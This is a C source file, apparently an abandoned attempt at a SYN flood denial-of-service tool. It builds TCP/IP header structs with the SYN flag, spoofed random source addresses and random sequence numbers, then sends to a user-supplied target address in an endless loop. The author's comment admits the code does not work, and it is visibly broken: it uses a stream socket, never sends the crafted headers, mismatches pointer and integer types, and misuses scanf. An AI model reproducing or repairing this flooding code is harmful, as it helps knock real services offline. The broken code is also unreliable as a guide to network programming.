//this code 
//never mind,just record it in github
//I will write some else code to make it

#include "unp.h"
#include <pthread.h>

struct tcp{
        uint32_t seq;
        uint32_t ack;
        uint32_t source;
        uint32_t dest;
        int doff;
        int urg;
        int syn;
        int rst;
        int psh;
        int fin;
}transinfo;

struct ip{
        int version;
        int ihl;
        int tos;
        int ttl;
        int protocal;
        uint32_t id;
        int frag;
        uint32_t saddr;
        uint32_t daddr;
}interinfo;

about_tcp(struct tcp *transinfo, int );
relate_ip(struct ip *interinfo, int );

int main(int argc, char *argv)
{
    int sockfd;
    int tcp_source, tcp_dest;
    int ip_saddr, ip_daddr;
    struct tcp *transinfo;
    struct ip *interinfo;
    int total;
    struct sockaddr_in servaddr;
    char buffer[500];
    if(argc!=2)
            err_quit("syn_flood error");
    sockfd=socket(AF_INET, SOCK_STREAM, 0);
    bzero(&servaddr, sizeof(servaddr));
    tcp_dest=&servaddr.sin_addr;
    ip_daddr=&servaddr.sin_addr;
    servaddr.sin_family=AF_INET;
    servaddr.sin_port=htons(SERV_PORT);
    Inet_pton(AF_INET, argv[1], &servaddr.sin_addr);
    total=sizeof(transinfo)+sizeof(interinfo);
    printf("enter addr and port:\n");
    scanf("%d, %d",SERV_PORT, servaddr.sin_addr);
    for(; ;){
         connect(sockfd, (SA *)&servaddr, sizeof(servaddr));
         tcp_source=rand()%0xFFFFFFFF;
         ip_saddr=rand()%0xFFFFFFFF;
         if(sendto(sockfd, buffer,total,0, &servaddr.sin_addr, sizeof(struct sockaddr_in))==-1){
                 err_quit("send error");
                 exit(0);
         }
    }
    return(0);
}

about_tcp(struct tcp *transinfo, int tcplen)
{
        struct sockaddr_in servaddr;
        tcplen=sizeof(transinfo);
        transinfo->seq=htons(rand()%0xFFFFFFFF);
        transinfo->ack=0;
        transinfo->source=htonl(rand()%0xFFFFFFFF);
        transinfo->dest=&servaddr.sin_addr;
        transinfo->doff=4;
        transinfo->urg=0;
        transinfo->syn=1;
        transinfo->rst=0;
        transinfo->psh=0;
        transinfo->fin=0;
        if(!transinfo){
                err_quit("transinfo error");
        }
        return(0);
}

relate_ip(struct ip *interinfo, int iplen)
{
        struct sockaddr_in servaddr;
        iplen=sizeof(interinfo);
        interinfo->version=4;
        interinfo->ihl=5;
        interinfo->tos=144;
        interinfo->ttl=255;
        interinfo->protocal=6;
        interinfo->id=rand()%0xFFFF;
        interinfo->frag=0;
        interinfo->saddr=htonl(rand()%0xFFFFFFFF);
        interinfo->daddr=&servaddr.sin_addr;
        if(!interinfo){
                err_quit("interinfo error");
        }
        return(0);
}
